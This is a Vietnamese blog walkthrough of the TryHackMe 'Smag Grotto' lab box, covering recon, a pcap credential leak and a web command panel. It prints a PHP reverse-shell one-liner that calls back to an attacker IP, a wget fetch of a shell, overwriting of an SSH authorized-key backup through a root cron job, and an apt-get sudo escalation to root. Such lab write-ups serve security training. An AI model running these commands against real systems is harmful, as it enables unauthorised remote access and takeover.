---
layout: post
author: "Neo"
title: "Tryhackme - Smag Grotto"
date: "2022-03-12"
tags: [
    "tryhackme",
    "web",
    "linux",
    "apt-get",
    "cron",
    "ssh-key",
    "ssh",
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-03-12-THM-Smag-Grotto/1.webp)

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải 1 Easy CTF [Tryhackme - Smag Grotto](https://tryhackme.com/room/smaggrotto)
## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở trên máy chủ mục tiêu.

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74e0e1b405856a15687e16daf2c76bee (RSA)
|   256 bd4362b9a1865136f8c7dff90f638fa3 (ECDSA)
|_  256 f9e7da078f10af970b3287c932d71b76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ngắm nghía qua web trên port 80, tôi có 1 trang default với nội dung trang web đang được phát triển, quay trở lại sau. Sau khi thử 1 vài path phổ biến thì tôi biết được đây là 1 trang php với "index.php". Thử dùng [dirsearch](https://github.com/maurosoria/dirsearch) để tìm web path

```python
[22:04:57] 200 -  402B  - /index.php                                        
[22:04:58] 200 -  402B  - /index.php/login/                                 
[22:05:07] 200 -    2KB - /mail/                                            
[22:05:08] 301 -  311B  - /mail  ->  http://10.10.67.154/mail/ 
```

Với path */mail/* tôi có 1 đoạn hội thoại với 3 người qua mail

![/mail](/assets/img/2022-03-12-THM-Smag-Grotto/2.webp)

Tôi có thêm 1 file pcap nữa ở đây, tải nó về và phân tích 

![wireshark](/assets/img/2022-03-12-THM-Smag-Grotto/3.webp)

Vậy là tôi phải thêm domain vào file hosts và sau đó có thể đăng nhập với username và password.

![dev](/assets/img/2022-03-12-THM-Smag-Grotto/4.webp)

Tôi cũng không biết command này theo format gì, thử các lệnh của linux hay windows đều không có kết quả.

Khi kiểm tra source web tôi còn phát hiện 1 địa chỉ mail bị ẩn nhưng hiện tại cũng chưa để làm gì

` trodd@smag.thm `

Có thể đây là username nên bị ẩn đi. Tôi không chắc nên sẽ quay lại sau

```python
<a href="[../aW1wb3J0YW50/dHJhY2Uy.pcap](view-source:http://10.10.67.154/aW1wb3J0YW50/dHJhY2Uy.pcap)">dHJhY2Uy.pcap</a>
				</div>
				<div class="card-action">
					<a>To: netadmin@smag.thm</a>
					<a>Cc: uzi@smag.thm</a>
					<!-- <a>Bcc: trodd@smag.thm</a> -->
					<a>From: jake@smag.thm</a>
				</div>
```

Trước file pcap vừa rồi là 1 path khác, thử truy cập vào path này nhưng cũng chỉ có file pcap. Trong trang default của path */mail* có 1 dòng note rằng tôi có thể download các file bằng wget, vậy nên tôi sẽ thử upload shell lên server bằng cách tải nó từ máy local của mình

Tạo local http server 

```python
┌──(neo㉿kali)-[~]
└─$ python -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Sau đó nhập câu lệnh vào phần command

`wget http://10.18.3.74:8000/shell.php`

Quay trở lại local machine tôi thấy file đã được tải lên nhưng không thể tìm được file để mở mặc dù đã thử các url khác nhau, tất nhiên là trước đó tôi đã tạo listener với port 2402: `nc -lnvp 2402`

Sau 1 lúc suy nghĩ tôi tự hỏi sao không thử luôn shell php trên command này. 

`php -r '$sock=fsockopen("10.6.0.191",2402);exec("/bin/bash <&3 >&3 2>&3");'`

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 2402
listening on [any] 2402 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.67.154] 49698
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Vậy là tôi đã quá phức tạp vấn đề lên rồi :confused: Config lại shell với python. xem qua file "passwd" thì tôi có 1 user khác với tên *jake*, sau khi thử các phương pháp đơn giản thì tôi tìm thấy vài thứ hay ho với cronjob

```python
www-data@smag:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
www-data@smag:/$ 
```

File public key sẽ được đọc và ghi vào ssh key của *jake*

```python
www-data@smag:/$ cat /opt/.backups/jake_id_rsa.pub.backup
cat /opt/.backups/jake_id_rsa.pub.backup
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5HGAnm2nNgzDW9OPAZ9dP0tZbvNrIJWa/swbWX1dogZPCFYn8Ys3P7oNPyzXS6ku72pviGs5kQsxNWpPY94bt2zvd1J6tBw5g64ox3BhCG4cUvuI5zEi7y+xnIiTs5/MoF/gjQ2IdNDdvMs/hDj4wc2x8TFLPlCmR1b/uHydkuvdtw9WzZN1O+Ax3yEkMfB8fO3F7UqN2798wBPpRNNysQ+59zIUbV9kJpvARBILjIupikOsTs8FMMp2Um6aSpFKWzt15na0vou0riNXDTgt6WtPYxmtv1AHE4VdD6xFJrM5CGffGbYEQjvJoFX2+vSOCDEFZw1SjuajykOaEOfheuY96Ao3f41m2Sn7Y9XiDt1UP4/Ws+kxfpX2mN69+jsPYmIKY72MSSm27nWG3jRgvPZsFgFyE00ZTP5dtrmoNf0CbzQBriJUa596XEsSOMmcjgoVgQUIr+WYNGWXgpH8G+ipFP/5whaJiqPIfPfvEHbT4m5ZsSaXuDmKercFeRDs= kali@kali
www-data@smag:/$ 
```

Tôi có thể xác thực ssh bằng cách thay đổi public key này thành public key của tôi. 

```python
┌──(neo㉿kali)-[~]
└─$ cat .ssh/id_rsa.pub          
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRyZarVKQLIN+BlzvSNzD9mMuF43Vfju/5TWxCxz7y67on3Ds/0oagsp6H0cDIiuYpyWfc4tAXlT21V+wVSqyzheHoWIFLCdC4aj1jrN+2+DYa5cwn56xzkya7jKImTUuE7oePcabooMUyQZlKwNUjjgdaswaTgv5MGbRnWsM6FJnMeir3esFgKy9cipQqLJh/aJP1LZ0YKfJb8vy3/hO3WdCC3MGir6cnk7Oznc6QkMm7e2Nk9deBLHoQY86BVN5KRbV9HX6rBFaV93MAScjTLsqyUB3YXX05K+parkr7Lx4HUS0ptwWOkKluaAbBPZ/+nnzirKBFNddW7rW4WsuL4glJDAIM9YJefQmsylPrn/wLOvZikpcLkoYDc1h2dWjG43xO7wWCfyQo3QtercMwfcA+r/qiQpuy+qwXi4nh0XHAxFcDlL2u0aAsf3jvQZk6DKUSHuHL9v5KIwZi6HkotqwRa2/v7SL0G8I9YKK/WCSzCj8iVIoHLm0YhBy/Zt0= neo@kali

┌──(neo㉿kali)-[~]
└─$
```

Đây là public key của tôi, ghi đè nó vào file backup của *jake*

```python
www-data@smag:/home$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRyZarVKQLIN+BlzvSNzD9mMuF43Vfju/5TWxCxz7y67on3Ds/0oagsp6H0cDIiuYpyWfc4tAXlT21V+wVSqyzheHoWIFLCdC4aj1jrN+2+DYa5cwn56xzkya7jKImTUuE7oePcabooMUyQZlKwNUjjgdaswaTgv5MGbRnWsM6FJnMeir3esFgKy9cipQqLJh/aJP1LZ0YKfJb8vy3/hO3WdCC3MGir6cnk7Oznc6QkMm7e2Nk9deBLHoQY86BVN5KRbV9HX6rBFaV93MAScjTLsqyUB3YXX05K+parkr7Lx4HUS0ptwWOkKluaAbBPZ/+nnzirKBFNddW7rW4WsuL4glJDAIM9YJefQmsylPrn/wLOvZikpcLkoYDc1h2dWjG43xO7wWCfyQo3QtercMwfcA+r/qiQpuy+qwXi4nh0XHAxFcDlL2u0aAsf3jvQZk6DKUSHuHL9v5KIwZi6HkotqwRa2/v7SL0G8I9YKK/WCSzCj8iVIoHLm0YhBy/Zt0= neo@kali" > /opt/.backups/jake_id_rsa.pub.backup

www-data@smag:/home$ 
```

Thử login lại ssh 

```python
┌──(neo㉿kali)-[~]
└─$ ssh jake@10.10.223.144        
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1001(netadmin)
jake@smag:~$ ls
user.txt
jake@smag:~$ 
```

## Privilege escalation

`sudo -l`

```python
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
jake@smag:~$
```

[GTFOBins](https://gtfobins.github.io/)

```python
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.txt
# 
```

